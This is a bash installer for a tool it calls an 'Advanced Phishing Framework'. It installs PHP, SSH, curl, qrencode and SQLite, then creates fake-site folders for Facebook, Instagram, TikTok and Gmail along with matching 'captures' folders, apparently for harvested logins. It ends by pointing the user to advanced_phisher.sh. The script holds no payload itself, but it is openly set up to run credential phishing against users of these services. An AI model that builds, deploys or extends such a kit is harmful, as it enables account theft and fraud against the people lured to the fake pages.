#!/bin/bash

# ============================================
# ADVANCED PHISHING FRAMEWORK - SETUP
# ============================================

set -e

GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'
BOLD='\033[1m'

echo -e "${BLUE}${BOLD}"
cat << "EOF"
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║     Advanced Phishing Framework - Professional Setup         ║
║                       -N2O-                                  ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

# Verificar no root
if [[ $EUID -eq 0 ]]; then
   echo -e "${RED}[!] Do not run as root${NC}"
   exit 1
fi

# Detectar SO
detect_os() {
    if [[ -f /etc/os-release ]]; then
        . /etc/os-release
        OS=$NAME
        VER=$VERSION_ID
    else
        OS=$(uname -s)
        VER=$(uname -r)
    fi
    echo -e "${GREEN}[✓] Detected OS: $OS $VER${NC}"
}

# Instalar dependencias
install_dependencies() {
    echo -e "\n${YELLOW}[*] Installing system dependencies...${NC}"
    
    local packages=("php" "php-cli" "php-sqlite3" "openssh-client" "curl" "wget" "git" "qrencode" "jq" "sqlite3" "xxd" "xclip")
    
    if command -v apt-get &> /dev/null; then
        sudo apt-get update
        sudo apt-get install -y "${packages[@]}"
    elif command -v pacman &> /dev/null; then
        sudo pacman -Syu --noconfirm "${packages[@]}"
    elif command -v yum &> /dev/null; then
        sudo yum install -y "${packages[@]}"
    else
        echo -e "${RED}[!] Unsupported package manager${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[✓] Dependencies installed${NC}"
}

# Crear estructura
setup_structure() {
    echo -e "\n${YELLOW}[*] Creating directory structure...${NC}"
    
    mkdir -p sites/{facebook,instagram,tiktok,gmail}
    mkdir -p modules
    mkdir -p logs/reports
    mkdir -p config
    mkdir -p captures/{FB,INS,TK,GML}
    
    echo -e "${GREEN}[✓] Directory structure created${NC}"
}

# Establecer permisos
set_permissions() {
    echo -e "\n${YELLOW}[*] Setting file permissions...${NC}"
    
    chmod +x advanced_phisher.sh 2>/dev/null || true
    chmod +x modules/* 2>/dev/null || true
    chmod -R 755 sites/ 2>/dev/null || true
    
    echo -e "${GREEN}[✓] Permissions set${NC}"
}

# Verificar instalación
verify_installation() {
    echo -e "\n${YELLOW}[*] Verifying installation...${NC}"
    
    local deps=("php" "ssh" "curl" "qrencode" "sqlite3")
    local all_ok=true
    
    for dep in "${deps[@]}"; do
        if command -v "$dep" &> /dev/null; then
            echo -e "${GREEN}[✓] $dep installed${NC}"
        else
            echo -e "${RED}[✗] $dep missing${NC}"
            all_ok=false
        fi
    done
    
    if [[ "$all_ok" == true ]]; then
        echo -e "\n${GREEN}${BOLD}[✓] Installation successful!${NC}"
        echo -e "\n${BLUE}To start the framework, run:${NC}"
        echo -e "${YELLOW}  ./advanced_phisher.sh${NC}"
    else
        echo -e "\n${RED}[✗] Installation incomplete${NC}"
        exit 1
    fi
}

# Main
main() {
    detect_os
    install_dependencies
    setup_structure
    set_permissions
    verify_installation
}

main "$@"
